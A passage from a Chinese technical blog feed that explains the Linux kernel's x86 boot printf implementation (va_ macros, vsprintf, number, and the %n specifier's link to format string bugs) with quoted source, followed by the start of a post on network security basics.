    <updated>2016-10-20T08:24:35.528Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.</p>
</blockquote>
<p>参考资料:<br><a href="https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c" target="_blank" rel="external">Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c</a></p>
<h2 id="printf大体"><a href="#printf大体" class="headerlink" title="printf大体"></a>printf大体</h2><p>首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下…大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.<br><img src="/images/printf.png" alt="printf"></p>
<h2 id="va-系类宏"><a href="#va-系类宏" class="headerlink" title="va_系类宏"></a>va_系类宏</h2><p>然后我们利用sublime的插件来jump到<code>va_list</code>的定义,发现是一个char*的typedef.干脆就一起来认识一下<code>va_</code>系列的宏.</p>
<p><code>acpi_native_int</code>也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.<code>_AUPBND</code>和<code>_ADNBND</code>两个宏的值一样.而<code>_bnd</code>这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.<code>va_start(ap, A)</code>这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而<code>va_arg(ap, T)</code>目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.<code>va_end(ap)</code>仅仅为了保证安全而象征性地将ap指向NULL.<br><img src="/images/va_arg.png" alt="va_arg"></p>
<h2 id="vsprintf"><a href="#vsprintf" class="headerlink" title="vsprintf"></a>vsprintf</h2><p>vsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)<br><img src="/images/vsprintf.png" alt="vsprintf"><br>在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEROPAD	1		<span class="comment">/* pad with zero */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGN	2		<span class="comment">/* unsigned/signed long */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PLUS	4		<span class="comment">/* show plus */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SPACE	8		<span class="comment">/* space if plus */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT	16		<span class="comment">/* left justified */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALL	32		<span class="comment">/* Must be 32 == 0x20 */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SPECIAL	64		<span class="comment">/* 0x */</span></span></div><div class="line"><span class="comment">/* process flags */</span></div><div class="line">		flags = <span class="number">0</span>;</div><div class="line">	      repeat:</div><div class="line">		++fmt;		<span class="comment">/* this also skips first '%' */</span></div><div class="line">		<span class="keyword">switch</span> (*fmt) &#123;</div><div class="line">		<span class="keyword">case</span> <span class="string">'-'</span>:</div><div class="line">			flags |= LEFT;</div><div class="line">			<span class="keyword">goto</span> repeat;</div><div class="line">		<span class="keyword">case</span> <span class="string">'+'</span>:</div><div class="line">			flags |= PLUS;</div><div class="line">			<span class="keyword">goto</span> repeat;</div><div class="line">		<span class="keyword">case</span> <span class="string">' '</span>:</div><div class="line">			flags |= SPACE;</div><div class="line">			<span class="keyword">goto</span> repeat;</div><div class="line">		<span class="keyword">case</span> <span class="string">'#'</span>:</div><div class="line">			flags |= SPECIAL;</div><div class="line">			<span class="keyword">goto</span> repeat;</div><div class="line">		<span class="keyword">case</span> <span class="string">'0'</span>:</div><div class="line">			flags |= ZEROPAD;</div><div class="line">			<span class="keyword">goto</span> repeat;</div><div class="line">		&#125;</div></pre></td></tr></table></figure></p>
<p>某些字段就不说了,用过printf的应该都知道的,其中的<code>#</code>作用就是方便16进制和8进制的格式化,例如<code>%#x</code>就会被默认加上<code>0x</code>,而<code>%#o</code>就会被默认加上<code>0</code>,具体可以看后面number函数实现就知道了.  </p>
<hr>
<blockquote>
<p>找工作太忙了,今天才得有空继续分析^~^(2016.10.17) </p>
</blockquote>
<hr>
<p>接下来就会去获得宽度字段,利用<code>isdigital</code>函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用<code>*</code>代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* get field width */</span></div><div class="line">		field_width = <span class="number">-1</span>;</div><div class="line">		<span class="keyword">if</span> (<span class="built_in">isdigit</span>(*fmt))</div><div class="line">			field_width = skip_atoi(&amp;fmt);</div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (*fmt == <span class="string">'*'</span>) &#123;</div><div class="line">			++fmt;</div><div class="line">			<span class="comment">/* it's the next argument */</span></div><div class="line">			field_width = va_arg(args, <span class="keyword">int</span>);</div><div class="line">			<span class="keyword">if</span> (field_width &lt; <span class="number">0</span>) &#123;</div><div class="line">				field_width = -field_width;</div><div class="line">				flags |= LEFT;</div><div class="line">			&#125;</div><div class="line">		&#125;</div></pre></td></tr></table></figure>
<p>再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有<code>.</code>字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有<code>l</code>,<code>L</code>,<code>h</code>跟在后面的将使得<code>qualifier</code>被置为其ascll码值.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* get the precision */</span></div><div class="line">		precision = <span class="number">-1</span>;</div><div class="line">		<span class="keyword">if</span> (*fmt == <span class="string">'.'</span>) &#123;</div><div class="line">			++fmt;</div><div class="line">			<span class="keyword">if</span> (<span class="built_in">isdigit</span>(*fmt))</div><div class="line">				precision = skip_atoi(&amp;fmt);</div><div class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (*fmt == <span class="string">'*'</span>) &#123;</div><div class="line">				++fmt;</div><div class="line">				<span class="comment">/* it's the next argument */</span></div><div class="line">				precision = va_arg(args, <span class="keyword">int</span>);</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">if</span> (precision &lt; <span class="number">0</span>)</div><div class="line">				precision = <span class="number">0</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">/* get the conversion qualifier */</span></div><div class="line">		qualifier = <span class="number">-1</span>;</div><div class="line">		<span class="keyword">if</span> (*fmt == <span class="string">'h'</span> || *fmt == <span class="string">'l'</span> || *fmt == <span class="string">'L'</span>) &#123;</div><div class="line">			qualifier = *fmt;</div><div class="line">			++fmt;</div><div class="line">		&#125;</div></pre></td></tr></table></figure></p>
<p>之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以<code>int</code>类型为地址单元取得参数的值直接强制转化为<code>unsigned char</code>类型的字符.为什么呢?详情参考我的另外一篇<a href="http://www.rutk1t0r.cn/2016/08/21/memory-align/" target="_blank" rel="external">文章</a>,我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的<code>strnlen</code>函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,<code>if</code>和<code>while</code>没有加<code>{}</code>可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成<code>任意地址读写任意数据</code>的格式化字符串漏洞.<br>之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是<code>continue</code>,意思是直接跳转到最外面的<code>for</code>循环进行下一个字符的匹配,而%xXdiu后面接的是<code>break</code>,表示退出<code>switch</code>,转而进行后面的<code>h,L,l</code>的长类型的处理去了.还要注意在<code>switch case break</code>的结构中,如果<code>case</code>了第一个条件,之后如果没有遇到<code>break</code>,程序的控制流程将忽略后面的<code>case</code>条件,直接执行语句部分,直到遇见结束的<code>break</code>.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* default base */</span></div><div class="line">		base = <span class="number">10</span>;</div><div class="line"></div><div class="line">		<span class="keyword">switch</span> (*fmt) &#123;</div><div class="line">		<span class="keyword">case</span> <span class="string">'c'</span>:</div><div class="line">			<span class="keyword">if</span> (!(flags &amp; LEFT))</div><div class="line">				<span class="keyword">while</span> (--field_width &gt; <span class="number">0</span>)</div><div class="line">					*str++ = <span class="string">' '</span>;</div><div class="line">			*str++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)va_arg(args, <span class="keyword">int</span>);</div><div class="line">			<span class="keyword">while</span> (--field_width &gt; <span class="number">0</span>)</div><div class="line">				*str++ = <span class="string">' '</span>;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line"></div><div class="line">		<span class="keyword">case</span> <span class="string">'s'</span>:</div><div class="line">			s = va_arg(args, <span class="keyword">char</span> *);</div><div class="line">			len = strnlen(s, precision);</div><div class="line"></div><div class="line">			<span class="keyword">if</span> (!(flags &amp; LEFT))</div><div class="line">				<span class="keyword">while</span> (len &lt; field_width--)</div><div class="line">					*str++ = <span class="string">' '</span>;</div><div class="line">			<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</div><div class="line">				*str++ = *s++;</div><div class="line">			<span class="keyword">while</span> (len &lt; field_width--)</div><div class="line">				*str++ = <span class="string">' '</span>;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line"></div><div class="line">		<span class="keyword">case</span> <span class="string">'p'</span>:</div><div class="line">			<span class="keyword">if</span> (field_width == <span class="number">-1</span>) &#123;</div><div class="line">				field_width = <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">void</span> *);</div><div class="line">				flags |= ZEROPAD;</div><div class="line">			&#125;</div><div class="line">			str = number(str,</div><div class="line">				     (<span class="keyword">unsigned</span> <span class="keyword">long</span>)va_arg(args, <span class="keyword">void</span> *), <span class="number">16</span>,</div><div class="line">				     field_width, precision, flags);</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line"></div><div class="line">		<span class="keyword">case</span> <span class="string">'n'</span>:</div><div class="line">			<span class="keyword">if</span> (qualifier == <span class="string">'l'</span>) &#123;</div><div class="line">				<span class="keyword">long</span> *ip = va_arg(args, <span class="keyword">long</span> *);</div><div class="line">				*ip = (str - buf);</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				<span class="keyword">int</span> *ip = va_arg(args, <span class="keyword">int</span> *);</div><div class="line">				*ip = (str - buf);</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line"></div><div class="line">		<span class="keyword">case</span> <span class="string">'%'</span>:</div><div class="line">			*str++ = <span class="string">'%'</span>;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line"></div><div class="line">			<span class="comment">/* integer number formats - set up the flags and "break" */</span></div><div class="line">		<span class="keyword">case</span> <span class="string">'o'</span>:</div><div class="line">			base = <span class="number">8</span>;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line"></div><div class="line">		<span class="keyword">case</span> <span class="string">'x'</span>:</div><div class="line">			flags |= SMALL;</div><div class="line">		<span class="keyword">case</span> <span class="string">'X'</span>:</div><div class="line">			base = <span class="number">16</span>;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line"></div><div class="line">		<span class="keyword">case</span> <span class="string">'d'</span>:</div><div class="line">		<span class="keyword">case</span> <span class="string">'i'</span>:</div><div class="line">			flags |= SIGN;</div><div class="line">		<span class="keyword">case</span> <span class="string">'u'</span>:</div><div class="line">			<span class="keyword">break</span>;</div><div class="line"></div><div class="line">		<span class="keyword">default</span>:</div><div class="line">			*str++ = <span class="string">'%'</span>;</div><div class="line">			<span class="keyword">if</span> (*fmt)</div><div class="line">				*str++ = *fmt;</div><div class="line">			<span class="keyword">else</span></div><div class="line">				--fmt;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (qualifier == <span class="string">'l'</span>)</div><div class="line">			num = va_arg(args, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (qualifier == <span class="string">'h'</span>) &#123;</div><div class="line">			num = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)va_arg(args, <span class="keyword">int</span>);</div><div class="line">			<span class="keyword">if</span> (flags &amp; SIGN)</div><div class="line">				num = (<span class="keyword">short</span>)num;</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; SIGN)</div><div class="line">			num = va_arg(args, <span class="keyword">int</span>);</div><div class="line">		<span class="keyword">else</span></div><div class="line">			num = va_arg(args, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</div><div class="line">		str = number(str, num, base, field_width, precision, flags);</div><div class="line">	&#125;</div><div class="line">	*str = <span class="string">'\0'</span>;</div><div class="line">	<span class="keyword">return</span> str - buf;</div></pre></td></tr></table></figure></p>
<h2 id="number函数"><a href="#number函数" class="headerlink" title="number函数"></a>number函数</h2><p>首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在<code>[]</code>里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时”返回”余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是<code>一切皆为文件</code>和<code>一切皆为表达式</code>.)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __do_div(n, base) (&#123; \</span></div><div class="line">int __res; \</div><div class="line">__res = ((unsigned long) n) % (unsigned) base; \</div><div class="line">n = ((unsigned long) n) / (unsigned) base; \</div><div class="line">__res; &#125;)</div></pre></td></tr></table></figure></p>
<p>再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.<code>static</code>类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.<code>char *</code>返回值表明能够实现链式功能,可对比<code>strcpy</code>函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个<code>num</code>是对%idp等格式化的栈参数的一个拷贝.第三个<code>base</code>顾名思义就是进制基数了.第四个<code>size</code>即为对齐宽度.第五个为精度,最后一个为标志位字段.<br>首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.<code>tmp[66]</code>我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为<code>long</code>的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32-&gt;第4位置位,使得可以很轻松地<code>或</code>运算实现大写字符-&gt;小写字符(ascll码相差32).如果<code>0</code>和<code>-</code>同时置位,gcc编译器会提示<code>warning: &#39;0&#39; flag ignored with &#39;-&#39; flag in gnu_printf format [-Wformat=]</code>,表明会忽略掉<code>0</code>的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的<code>&amp;= ~</code>运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除<code>补零</code>标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符<code>c</code>也是用来填充的,为<code>0</code>或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据<code>size</code>和置位<code>sign</code>.之后判断16进制和8进制情况,16进制的<code>size</code>减2是由于要填充<code>0x</code>或者<code>0X</code>,8进制只需要填充<code>0</code>即可.之后就开始进制转换成字符了,并根据<code>locase</code>的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的<code>precision</code>表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果<code>ZEROPAD</code>和<code>LEFT</code>都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据<code>size</code>的剩余大小继续填充<code>c</code>,后面就根据i的情况填充了,直到满足<code>size</code>这个宽度域为0.最后返回<code>str</code>的首地址.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">number</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">long</span> num, <span class="keyword">int</span> base, <span class="keyword">int</span> size, <span class="keyword">int</span> precision,</span></span></div><div class="line">		    <span class="keyword">int</span> type)</div><div class="line">&#123;</div><div class="line">	<span class="comment">/* we are called with base 8, 10 or 16, only, thus don't need "G..."  */</span></div><div class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> digits[<span class="number">16</span>] = <span class="string">"0123456789ABCDEF"</span>; <span class="comment">/* "GHIJKLMNOPQRSTUVWXYZ"; */</span></div><div class="line"></div><div class="line">	<span class="keyword">char</span> tmp[<span class="number">66</span>];</div><div class="line">	<span class="keyword">char</span> c, sign, locase;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line"></div><div class="line">	<span class="comment">/* locase = 0 or 0x20. ORing digits or letters with 'locase'</span></div><div class="line">	 * produces same digits or (maybe lowercased) letters */</div><div class="line">	locase = (type &amp; SMALL);</div><div class="line">	<span class="keyword">if</span> (type &amp; LEFT)</div><div class="line">		type &amp;= ~ZEROPAD;</div><div class="line">	<span class="keyword">if</span> (base &lt; <span class="number">2</span> || base &gt; <span class="number">16</span>)</div><div class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">	c = (type &amp; ZEROPAD) ? <span class="string">'0'</span> : <span class="string">' '</span>;</div><div class="line">	sign = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (type &amp; SIGN) &#123;</div><div class="line">		<span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</div><div class="line">			sign = <span class="string">'-'</span>;</div><div class="line">			num = -num;</div><div class="line">			size--;</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &amp; PLUS) &#123;</div><div class="line">			sign = <span class="string">'+'</span>;</div><div class="line">			size--;</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &amp; SPACE) &#123;</div><div class="line">			sign = <span class="string">' '</span>;</div><div class="line">			size--;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (type &amp; SPECIAL) &#123;</div><div class="line">		<span class="keyword">if</span> (base == <span class="number">16</span>)</div><div class="line">			size -= <span class="number">2</span>;</div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (base == <span class="number">8</span>)</div><div class="line">			size--;</div><div class="line">	&#125;</div><div class="line">	i = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (num == <span class="number">0</span>)</div><div class="line">		tmp[i++] = <span class="string">'0'</span>;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">while</span> (num != <span class="number">0</span>)</div><div class="line">			tmp[i++] = (digits[__do_div(num, base)] | locase);</div><div class="line">	<span class="keyword">if</span> (i &gt; precision)</div><div class="line">		precision = i;</div><div class="line">	size -= precision;</div><div class="line">	<span class="keyword">if</span> (!(type &amp; (ZEROPAD + LEFT)))</div><div class="line">		<span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</div><div class="line">			*str++ = <span class="string">' '</span>;</div><div class="line">	<span class="keyword">if</span> (sign)</div><div class="line">		*str++ = sign;</div><div class="line">	<span class="keyword">if</span> (type &amp; SPECIAL) &#123;</div><div class="line">		<span class="keyword">if</span> (base == <span class="number">8</span>)</div><div class="line">			*str++ = <span class="string">'0'</span>;</div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (base == <span class="number">16</span>) &#123;</div><div class="line">			*str++ = <span class="string">'0'</span>;</div><div class="line">			*str++ = (<span class="string">'X'</span> | locase);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (!(type &amp; LEFT))</div><div class="line">		<span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</div><div class="line">			*str++ = c;</div><div class="line">	<span class="keyword">while</span> (i &lt; precision--)</div><div class="line">		*str++ = <span class="string">'0'</span>;</div><div class="line">	<span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</div><div class="line">		*str++ = tmp[i];</div><div class="line">	<span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</div><div class="line">		*str++ = <span class="string">' '</span>;</div><div class="line">	<span class="keyword">return</span> str;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h2><p>至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到<code>格式化字符串漏洞</code>参考看雪论坛这篇<a href="http://bbs.pediy.com/showthread.php?t=213153" target="_blank" rel="external">文章</a>,如果没注册看不了的话先<a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458279936&amp;idx=1&amp;sn=2eb47265a0d170c45403d4b5d9097549&amp;chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&amp;scene=0#wechat_redirect" target="_blank" rel="external">戳这里吧</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
      <category term="misc" scheme="http://embpgp.github.io/categories/study/misc/"/>
    
    
      <category term="C/C++" scheme="http://embpgp.github.io/tags/C-C/"/>
    
      <category term="Linux kernel" scheme="http://embpgp.github.io/tags/Linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>网络安全基本要素及对策</title>
    <link href="http://embpgp.github.io/2016/09/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E6%9C%AC%E8%A6%81%E7%B4%A0%E5%8F%8A%E5%AF%B9%E7%AD%96/"/>
    <id>http://embpgp.github.io/2016/09/18/网络安全基本要素及对策/</id>
    <published>2016-09-18T03:49:15.000Z</published>
    <updated>2016-11-04T02:32:28.341Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)</p>
</blockquote>
<h2 id="机密性"><a href="#机密性" class="headerlink" title="机密性"></a>机密性</h2><p>定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。<br>策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)</p>
